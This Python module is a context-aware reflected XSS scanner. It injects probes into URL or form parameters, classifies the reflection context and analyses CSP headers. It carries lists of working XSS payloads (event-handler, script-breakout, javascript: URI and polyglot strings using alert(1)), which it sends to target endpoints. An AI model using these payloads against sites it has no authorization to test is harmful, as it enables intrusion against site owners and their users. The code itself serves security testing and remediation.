"""
Context-Aware XSS Detection Engine

Comprehensive XSS scanner that detects the reflection context
(HTML body, attribute, JavaScript, URL, CSS, comment) and tests
context-specific payloads. Includes CSP analysis and encoding checks.
"""
import asyncio
import html as html_mod
import logging
import re
import secrets
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

import httpx

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Reflection context enum-like constants
# ---------------------------------------------------------------------------
CTX_HTML_BODY = "html_body"
CTX_ATTR_DOUBLE = "attribute_double_quoted"
CTX_ATTR_SINGLE = "attribute_single_quoted"
CTX_ATTR_UNQUOTED = "attribute_unquoted"
CTX_JS_STRING_DQ = "js_string_double_quoted"
CTX_JS_STRING_SQ = "js_string_single_quoted"
CTX_JS_TEMPLATE = "js_template_literal"
CTX_URL_HREF = "url_context"
CTX_CSS = "css_context"
CTX_COMMENT = "html_comment"

# ---------------------------------------------------------------------------
# Context-specific payloads: (payload_string, context_name)
# ---------------------------------------------------------------------------
CONTEXT_PAYLOADS: dict[str, list[str]] = {
    CTX_HTML_BODY: [
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<details/open/ontoggle=alert(1)>",
        "<body onload=alert(1)>",
        "<marquee onstart=alert(1)>",
    ],
    CTX_ATTR_DOUBLE: [
        '" onmouseover="alert(1)',
        '"autofocus onfocus="alert(1)',
        '"><img src=x onerror=alert(1)>',
        '" onfocus="alert(1)" autofocus="',
        '"><svg/onload=alert(1)>',
    ],
    CTX_ATTR_SINGLE: [
        "' onmouseover='alert(1)",
        "'><img src=x onerror=alert(1)>",
        "' onfocus='alert(1)' autofocus='",
        "'><svg/onload=alert(1)>",
    ],
    CTX_ATTR_UNQUOTED: [
        " onmouseover=alert(1) ",
        "><img src=x onerror=alert(1)>",
        " onfocus=alert(1) autofocus ",
    ],
    CTX_JS_STRING_DQ: [
        '";alert(1)//',
        '";alert(1);"',
        "</script><script>alert(1)</script>",
        '"-alert(1)-"',
    ],
    CTX_JS_STRING_SQ: [
        "';alert(1)//",
        "';alert(1);'",
        "</script><script>alert(1)</script>",
        "'-alert(1)-'",
    ],
    CTX_JS_TEMPLATE: [
        "${alert(1)}",
        "`-alert(1)-`",
        "</script><script>alert(1)</script>",
    ],
    CTX_URL_HREF: [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "javascript:alert(document.domain)",
    ],
    CTX_CSS: [
        "};alert(1)//",
        "expression(alert(1))",
        "</style><script>alert(1)</script>",
        "url(javascript:alert(1))",
    ],
    CTX_COMMENT: [
        "--><script>alert(1)</script><!--",
        "--><img src=x onerror=alert(1)><!--",
        "--><svg/onload=alert(1)><!--",
    ],
}

# Polyglot payloads — designed to work across multiple contexts
POLYGLOT_PAYLOADS = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//"
    "%0teledata%0a//-->*/alert()/*",
    "\"><img src=x onerror=alert(1)>'><svg/onload=alert(1)>",
    "'-alert(1)-'",
    "'\"><svg/onload=alert(1)>//",
    "</script><script>alert(1)</script>",
]

# HTML entities / URL-encoding that indicate proper escaping
_HTML_ESCAPE_MAP = {
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#x27;",
    "&": "&amp;",
}

_URL_ESCAPE_MAP = {
    "<": "%3C",
    ">": "%3E",
    '"': "%22",
    "'": "%27",
}


# ---------------------------------------------------------------------------
# CSP analysis helpers
# ---------------------------------------------------------------------------
def _parse_csp(csp_header: str) -> dict[str, str]:
    """Parse a CSP header into directive -> value mapping."""
    directives: dict[str, str] = {}
    for part in csp_header.split(";"):
        part = part.strip()
        if not part:
            continue
        tokens = part.split(None, 1)
        key = tokens[0].lower()
        val = tokens[1] if len(tokens) > 1 else ""
        directives[key] = val
    return directives


def _analyze_csp(headers: dict) -> dict:
    """Analyze CSP headers and return status + weaknesses.

    Returns:
        {
            "status": "strict" | "weak" | "none",
            "weaknesses": ["..."],
            "raw": "<csp header>"
        }
    """
    csp_raw = ""
    for name, value in headers.items():
        if name.lower() in ("content-security-policy", "content-security-policy-report-only"):
            csp_raw = value
            break

    if not csp_raw:
        return {"status": "none", "weaknesses": ["No Content-Security-Policy header"], "raw": ""}

    directives = _parse_csp(csp_raw)
    weaknesses: list[str] = []

    script_src = directives.get("script-src", directives.get("default-src", ""))

    if "'unsafe-inline'" in script_src:
        weaknesses.append("script-src allows 'unsafe-inline' — inline scripts execute")
    if "'unsafe-eval'" in script_src:
        weaknesses.append("script-src allows 'unsafe-eval' — eval() permitted")
    if "data:" in script_src:
        weaknesses.append("script-src allows data: URIs")
    if "*" in script_src.split():
        weaknesses.append("script-src uses wildcard — any domain can serve scripts")
    if "http:" in script_src:
        weaknesses.append("script-src allows http: — scripts over insecure HTTP")
    if not directives.get("script-src") and not directives.get("default-src"):
        weaknesses.append("No script-src or default-src directive")

    # JSONP-capable domains
    jsonp_domains = [
        "googleapis.com", "accounts.google.com", "cdnjs.cloudflare.com",
        "ajax.googleapis.com", "cdn.jsdelivr.net",
    ]
    for domain in jsonp_domains:
        if domain in script_src:
            weaknesses.append(f"script-src includes {domain} — JSONP callback bypass possible")

    status = "strict" if not weaknesses else "weak"
    return {"status": status, "weaknesses": weaknesses, "raw": csp_raw}


# ---------------------------------------------------------------------------
# Core engine
# ---------------------------------------------------------------------------
class XSSEngine:
    """Context-aware XSS detection engine.

    Usage:
        engine = XSSEngine(rate_limit=semaphore)
        findings = await engine.test_endpoint(url, param, method="GET")
    """

    def __init__(
        self,
        rate_limit: asyncio.Semaphore | None = None,
        client: httpx.AsyncClient | None = None,
        max_payloads_per_context: int = 5,
    ):
        self.rate_limit = rate_limit or asyncio.Semaphore(10)
        self._external_client = client
        self.max_payloads = max_payloads_per_context
        # Unique probe per engine instance so concurrent scans don't collide
        self._probe = f"xss{secrets.token_hex(4)}"

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------
    async def test_endpoint(
        self,
        url: str,
        param: str,
        method: str = "GET",
        context: str | None = None,
        client: httpx.AsyncClient | None = None,
    ) -> list[dict]:
        """Test a single endpoint+param for XSS across all detected contexts.

        Args:
            url: Target URL.
            param: Query/body parameter to inject into.
            method: HTTP method (GET or POST).
            context: Force a specific context (skip detection).
            client: httpx.AsyncClient to reuse. Falls back to self._external_client
                    or creates a temporary one.

        Returns:
            List of confirmed XSS finding dicts.
        """
        http = client or self._external_client
        own_client = False
        if http is None:
            from app.utils.http_client import make_client
            http = make_client(follow_redirects=True)
            own_client = True

        try:
            return await self._run_tests(http, url, param, method, context)
        except Exception as exc:
            logger.warning(f"XSSEngine error on {url} param={param}: {exc}")
            return []
        finally:
            if own_client:
                await http.aclose()

    async def test_endpoints_batch(
        self,
        endpoints: list[dict],
        client: httpx.AsyncClient | None = None,
        max_endpoints: int = 30,
    ) -> list[dict]:
        """Test multiple endpoints. Each endpoint dict needs 'url' and optionally
        'params' (list[str]), 'method' (str), 'fields' (list[str]).
        """
        http = client or self._external_client
        own_client = False
        if http is None:
            from app.utils.http_client import make_client
            http = make_client(follow_redirects=True)
            own_client = True

        all_findings: list[dict] = []
        tested: set[tuple[str, str]] = set()

        try:
            for ep in endpoints[:max_endpoints]:
                url = ep if isinstance(ep, str) else ep.get("url", "")
                if not url:
                    continue
                params = []
                if isinstance(ep, dict):
                    params = ep.get("params", []) or ep.get("fields", [])
                    method = ep.get("method", "GET").upper()
                else:
                    method = "GET"

                # If no explicit params, try to extract from query string
                if not params:
                    parsed = urlparse(url)
                    qs = parse_qs(parsed.query, keep_blank_values=True)
                    params = list(qs.keys())

                if not params:
                    continue

                for param in params[:5]:  # max 5 params per endpoint
                    dedup = (url.split("?")[0], param)
                    if dedup in tested:
                        continue
                    tested.add(dedup)

                    findings = await self._run_tests(http, url, param, method, None)
                    all_findings.extend(findings)
                    if findings:
                        break  # one confirmed XSS per endpoint is enough

        except Exception as exc:
            logger.warning(f"XSSEngine batch error: {exc}")
        finally:
            if own_client:
                await http.aclose()

        return all_findings

    # ------------------------------------------------------------------
    # Internal: test pipeline
    # ------------------------------------------------------------------
    async def _run_tests(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        method: str,
        forced_context: str | None,
    ) -> list[dict]:
        findings: list[dict] = []
        from urllib.parse import unquote

        # Step 1 — Send unique probe to detect reflection & context
        probe_resp = await self._send_payload(client, url, param, self._probe, method)
        if probe_resp is None:
            return findings
        probe_body = probe_resp.text
        # Check for reflection in both raw and URL-decoded response
        if self._probe not in probe_body:
            probe_body_decoded = unquote(probe_body)
            if self._probe not in probe_body_decoded:
                return findings  # Not reflected at all
            probe_body = probe_body_decoded  # Use decoded body for context detection

        response_body = probe_body
        resp_headers = dict(probe_resp.headers)

        # Step 2 — Detect all contexts where the probe appears
        if forced_context:
            contexts = [forced_context]
        else:
            contexts = self._detect_contexts(response_body, self._probe)
            if not contexts:
                contexts = [CTX_HTML_BODY]  # fallback

        logger.info(f"XSS probe reflected in contexts {contexts} at {url} param={param}")

        # Step 3 — Analyze CSP (once per endpoint)
        csp_info = _analyze_csp(resp_headers)

        # Step 4 — Test context-specific payloads
        for ctx in contexts:
            payloads = CONTEXT_PAYLOADS.get(ctx, CONTEXT_PAYLOADS[CTX_HTML_BODY])
            for payload in payloads[: self.max_payloads]:
                resp = await self._send_payload(client, url, param, payload, method)
                if resp is None:
                    continue

                if self._is_xss_successful(payload, resp.text, ctx):
                    # Extract evidence snippet
                    evidence = self._extract_evidence(payload, resp.text)
                    severity = self._compute_severity(ctx, csp_info)

                    findings.append({
                        "title": f"Reflected XSS in {ctx.replace('_', ' ')} context",
                        "url": url,
                        "param": param,
                        "method": method,
                        "context": ctx,
                        "payload": payload,
                        "severity": severity,
                        "vuln_type": "xss_reflected",
                        "csp_status": csp_info["status"],
                        "csp_weaknesses": csp_info.get("weaknesses", []),
                        "evidence": evidence,
                        "impact": self._impact_text(ctx, csp_info),
                        "remediation": self._remediation_text(ctx),
                    })
                    break  # one proof per context is enough

        # Step 5 — If no context-specific payload worked, try polyglots
        if not findings:
            for payload in POLYGLOT_PAYLOADS:
                resp = await self._send_payload(client, url, param, payload, method)
                if resp is None:
                    continue
                if self._is_xss_successful(payload, resp.text, CTX_HTML_BODY):
                    evidence = self._extract_evidence(payload, resp.text)
                    severity = self._compute_severity(CTX_HTML_BODY, csp_info)
                    findings.append({
                        "title": "Reflected XSS via polyglot payload",
                        "url": url,
                        "param": param,
                        "method": method,
                        "context": "polyglot",
                        "payload": payload,
                        "severity": severity,
                        "vuln_type": "xss_reflected",
                        "csp_status": csp_info["status"],
                        "csp_weaknesses": csp_info.get("weaknesses", []),
                        "evidence": evidence,
                        "impact": self._impact_text("polyglot", csp_info),
                        "remediation": self._remediation_text("polyglot"),
                    })
                    break

        return findings

    # ------------------------------------------------------------------
    # Context detection
    # ------------------------------------------------------------------
    def _detect_contexts(self, body: str, probe: str) -> list[str]:
        """Detect all contexts where *probe* is reflected in *body*."""
        contexts: list[str] = []
        escaped_probe = re.escape(probe)

        # HTML comment: <!-- ... probe ... -->
        if re.search(r'<!--[^>]*?' + escaped_probe + r'[^>]*?-->', body, re.DOTALL):
            contexts.append(CTX_COMMENT)

        # CSS context: style="...probe..." or <style>...probe...</style>
        if re.search(
            r'(?:style\s*=\s*["\'][^"\']*?' + escaped_probe + r'|'
            r'<style[^>]*>[^<]*?' + escaped_probe + r')',
            body, re.IGNORECASE | re.DOTALL,
        ):
            contexts.append(CTX_CSS)

        # JavaScript string contexts
        # Double-quoted JS string
        if re.search(r'<script[^>]*>[^<]*?"[^"]*?' + escaped_probe + r'[^"]*?"', body, re.DOTALL | re.IGNORECASE):
            contexts.append(CTX_JS_STRING_DQ)
        # Single-quoted JS string
        elif re.search(r"<script[^>]*>[^<]*?'[^']*?" + escaped_probe + r"[^']*?'", body, re.DOTALL | re.IGNORECASE):
            contexts.append(CTX_JS_STRING_SQ)
        # Template literal
        elif re.search(r'<script[^>]*>[^<]*?`[^`]*?' + escaped_probe + r'[^`]*?`', body, re.DOTALL | re.IGNORECASE):
            contexts.append(CTX_JS_TEMPLATE)
        # Generic JS context (not in a string — e.g., var x = probe)
        elif re.search(r'<script[^>]*>[^<]*?' + escaped_probe, body, re.DOTALL | re.IGNORECASE):
            # Already in JS but not matched as string — treat as JS DQ for breakout
            if CTX_JS_STRING_DQ not in contexts:
                contexts.append(CTX_JS_STRING_DQ)

        # URL context: href="probe", src="probe", action="probe"
        if re.search(
            r'(?:href|src|action)\s*=\s*["\']?\s*[^"\'>\s]*?' + escaped_probe,
            body, re.IGNORECASE,
        ):
            contexts.append(CTX_URL_HREF)

        # HTML attribute contexts (must check BEFORE html body)
        # Double-quoted attribute
        attr_dq = re.search(
            r'(\w+)\s*=\s*"[^"]*?' + escaped_probe + r'[^"]*?"',
            body, re.IGNORECASE,
        )
        # Single-quoted attribute
        attr_sq = re.search(
            r"(\w+)\s*=\s*'[^']*?" + escaped_probe + r"[^']*?'",
            body, re.IGNORECASE,
        )
        # Unquoted attribute
        attr_uq = re.search(
            r'(\w+)\s*=\s*' + escaped_probe + r'[\s>]',
            body, re.IGNORECASE,
        )

        if attr_dq:
            attr_name = attr_dq.group(1).lower()
            # Skip if already classified as URL or CSS context for this same attr
            if attr_name not in ("href", "src", "action", "style"):
                contexts.append(CTX_ATTR_DOUBLE)
            elif attr_name in ("href", "src", "action") and CTX_URL_HREF not in contexts:
                contexts.append(CTX_URL_HREF)
        if attr_sq:
            attr_name = attr_sq.group(1).lower()
            if attr_name not in ("href", "src", "action", "style"):
                contexts.append(CTX_ATTR_SINGLE)
        if attr_uq:
            contexts.append(CTX_ATTR_UNQUOTED)

        # HTML body (text content between tags)
        if re.search(r'(?<=>)\s*[^<]*?' + escaped_probe + r'[^<]*?\s*(?=<)', body, re.DOTALL):
            # Only add if not already in a more specific context
            if not contexts:
                contexts.append(CTX_HTML_BODY)
            elif all(c in (CTX_COMMENT,) for c in contexts):
                # Also in body besides comment
                contexts.append(CTX_HTML_BODY)

        # Deduplicate while preserving order
        seen = set()
        unique: list[str] = []
        for c in contexts:
            if c not in seen:
                seen.add(c)
                unique.append(c)
        return unique

    # ------------------------------------------------------------------
    # Successful XSS detection
    # ------------------------------------------------------------------
    def _is_xss_successful(self, payload: str, body: str, context: str) -> bool:
        """Check if *payload* appears UNESCAPED and in an executable position."""
        # Check both exact payload and URL-decoded body for reflection
        from urllib.parse import unquote
        body_decoded = unquote(body)

        payload_found = payload in body or payload in body_decoded
        if not payload_found:
            # Also check case-insensitive for event handler payloads
            if payload.lower() in body.lower():
                payload_found = True

        if not payload_found:
            return False

        # Use the body variant where the payload was found
        check_body = body if payload in body else body_decoded

        # Check that it's not HTML-entity-escaped
        escaped_payload = html_mod.escape(payload)
        if escaped_payload != payload and escaped_payload in check_body:
            # The escaped version exists — check if the raw also exists independently
            # Remove escaped occurrences and see if raw still appears
            cleaned = check_body.replace(escaped_payload, "")
            if payload not in cleaned:
                return False

        # Check URL-encoding
        for char, encoded in _URL_ESCAPE_MAP.items():
            if char in payload:
                url_escaped = payload.replace(char, encoded)
                if url_escaped in check_body and payload not in check_body.replace(url_escaped, "PLACEHOLDER"):
                    return False

        # Context-specific verification
        if context in (CTX_ATTR_DOUBLE, CTX_ATTR_SINGLE):
            return self._verify_attr_breakout(payload, check_body, context)
        if context in (CTX_JS_STRING_DQ, CTX_JS_STRING_SQ, CTX_JS_TEMPLATE):
            return self._verify_js_breakout(payload, check_body)
        if context == CTX_COMMENT:
            return self._verify_comment_breakout(payload, check_body)

        # For HTML body / URL / CSS / polyglot — presence of unescaped payload is enough
        # but verify key characters are not individually escaped
        critical_chars = ["<", ">"]
        if context in (CTX_HTML_BODY, "polyglot"):
            for char in critical_chars:
                if char in payload:
                    idx = check_body.find(payload)
                    if idx == -1:
                        return False
                    # payload is literally present, so chars are not escaped
                    return True
            return True

        return True

    def _verify_attr_breakout(self, payload: str, body: str, context: str) -> bool:
        """Verify that an attribute-context payload actually breaks out of the attribute."""
        quote = '"' if context == CTX_ATTR_DOUBLE else "'"
        # The payload should contain the closing quote
        if quote not in payload:
            return False
        # Find the payload in body and check surrounding structure
        idx = body.find(payload)
        if idx == -1:
            return False
        # Look backwards for the opening of the attribute
        before = body[max(0, idx - 200):idx]
        # Should find pattern like: attr="...
        if re.search(r'\w+\s*=\s*' + re.escape(quote) + r'[^' + quote + r']*$', before):
            return True
        return True  # Conservatively: payload is present unescaped

    def _verify_js_breakout(self, payload: str, body: str) -> bool:
        """Verify JS string breakout payload is not escaped."""
        # If backslash-escaped quotes appear, it's sanitized
        for esc in ['\\"', "\\'", "\\`"]:
            if esc in payload:
                continue
            # Check if the response has the escaped version instead
            for quote in ['"', "'", "`"]:
                if quote in payload:
                    escaped_version = payload.replace(quote, "\\" + quote)
                    if escaped_version in body:
                        # Check raw version is not just the escaped one
                        cleaned = body.replace(escaped_version, "")
                        if payload not in cleaned:
                            return False
        return True

    def _verify_comment_breakout(self, payload: str, body: str) -> bool:
        """Verify HTML comment breakout payload closes the comment."""
        # Payload must contain --> to close comment
        if "-->" not in payload:
            return False
        idx = body.find(payload)
        if idx == -1:
            return False
        return True

    # ------------------------------------------------------------------
    # HTTP helpers
    # ------------------------------------------------------------------
    async def _send_payload(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        payload: str,
        method: str,
    ) -> httpx.Response | None:
        """Send a payload via GET or POST, respecting rate limit."""
        try:
            async with self.rate_limit:
                if method.upper() == "GET":
                    test_url = self._inject_param(url, param, payload)
                    return await client.get(test_url, timeout=10.0)
                else:
                    return await client.post(url, data={param: payload}, timeout=10.0)
        except Exception as exc:
            logger.debug(f"XSSEngine request failed: {exc}")
            return None

    @staticmethod
    def _inject_param(url: str, param: str, value: str) -> str:
        """Inject a value into a URL query parameter."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        flat = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
        return urlunparse(parsed._replace(query=urlencode(flat)))

    # ------------------------------------------------------------------
    # Evidence & severity helpers
    # ------------------------------------------------------------------
    def _extract_evidence(self, payload: str, body: str, window: int = 120) -> str:
        """Extract a snippet of the response around the reflected payload."""
        from urllib.parse import unquote
        idx = body.find(payload)
        if idx == -1:
            # Try URL-decoded body
            body_decoded = unquote(body)
            idx = body_decoded.find(payload)
            if idx != -1:
                body = body_decoded
            else:
                return "(payload reflected but exact position unclear)"
        start = max(0, idx - window // 2)
        end = min(len(body), idx + len(payload) + window // 2)
        snippet = body[start:end]
        # Collapse whitespace for readability
        snippet = re.sub(r'\s+', ' ', snippet).strip()
        if start > 0:
            snippet = "..." + snippet
        if end < len(body):
            snippet = snippet + "..."
        return snippet

    @staticmethod
    def _compute_severity(context: str, csp_info: dict) -> str:
        """Determine severity based on context and CSP."""
        # Base severity by context
        base = "high"
        if context in (CTX_CSS, CTX_COMMENT):
            base = "medium"
        elif context == CTX_URL_HREF:
            base = "high"

        # CSP mitigation lowers severity by one level
        if csp_info.get("status") == "strict":
            severity_map = {"critical": "high", "high": "medium", "medium": "low", "low": "info"}
            return severity_map.get(base, base)

        return base

    @staticmethod
    def _impact_text(context: str, csp_info: dict) -> str:
        """Generate impact description."""
        ctx_desc = {
            CTX_HTML_BODY: "HTML body context — attacker can inject arbitrary HTML tags with event handlers",
            CTX_ATTR_DOUBLE: "double-quoted HTML attribute — attacker can break out of the attribute and inject event handlers",
            CTX_ATTR_SINGLE: "single-quoted HTML attribute — attacker can break out with a single quote and inject event handlers",
            CTX_ATTR_UNQUOTED: "unquoted HTML attribute — trivial breakout, attacker can inject event handlers without any quote",
            CTX_JS_STRING_DQ: "JavaScript double-quoted string — attacker can break out and execute arbitrary JavaScript",
            CTX_JS_STRING_SQ: "JavaScript single-quoted string — attacker can break out and execute arbitrary JavaScript",
            CTX_JS_TEMPLATE: "JavaScript template literal — attacker can inject expressions via ${...} syntax",
            CTX_URL_HREF: "URL/href context — attacker can inject javascript: or data: URIs to execute code on click",
            CTX_CSS: "CSS context — attacker may inject CSS expressions or break out to inject script tags",
            CTX_COMMENT: "HTML comment context — attacker can close the comment and inject executable HTML",
            "polyglot": "multiple contexts — polyglot payload bypasses context-specific filters",
        }
        impact = ctx_desc.get(context, "Reflected XSS — attacker can execute arbitrary JavaScript in victim's browser")
        impact += ". Can steal cookies/tokens, perform actions as the user, or redirect to phishing pages."

        if csp_info.get("status") == "strict":
            impact += " NOTE: Strict CSP is in place, which may mitigate exploitation."
        elif csp_info.get("status") == "weak":
            impact += " CSP is present but weak — does not prevent exploitation."
        elif csp_info.get("status") == "none":
            impact += " No CSP header — no browser-side mitigation."

        return impact

    @staticmethod
    def _remediation_text(context: str) -> str:
        """Generate remediation advice."""
        base = (
            "Encode all user input before rendering in the response. "
            "Use context-appropriate encoding: HTML-entity encoding for HTML body, "
            "attribute encoding for attributes, JavaScript encoding for JS strings, "
            "URL encoding for URLs. "
            "Implement a strict Content-Security-Policy header with nonce-based script loading. "
            "Avoid inserting user input into dangerous contexts (inline scripts, event handlers)."
        )
        if context in (CTX_JS_STRING_DQ, CTX_JS_STRING_SQ, CTX_JS_TEMPLATE):
            base += " For JavaScript contexts: avoid embedding user data in inline scripts entirely; use data attributes or JSON-safe serialization instead."
        if context == CTX_URL_HREF:
            base += " For URL contexts: validate that URLs use http/https schemes only; reject javascript: and data: URIs."
        return base
